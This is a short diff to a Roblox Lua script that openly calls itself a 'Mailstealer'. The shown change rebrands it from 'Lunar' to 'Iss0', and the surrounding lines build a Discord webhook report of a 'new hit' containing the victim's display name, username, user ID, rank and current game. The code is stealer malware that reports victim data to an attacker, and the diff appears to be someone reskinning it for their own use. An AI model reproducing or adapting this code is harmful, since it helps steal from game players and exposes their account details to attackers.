@@ -18,10 +18,10 @@ _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 local function sendwebhook(msg)
 local msg = {
-  ["content"]= "**Lunar Mailstealer has detected a new hit!**",
+  ["content"]= "**Iss0 Mailstealer has detected a new hit!**",
   ["embeds"]= {
     {
-      ["title"]= "`Lunar Mailstealer Results`",
+      ["title"]= "`Iss0 Mailstealer Results`",
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
       ["url"]= "https://discord.gg/pd65DxGhVc",
       ["color"]= ""..webhookcolor.."",
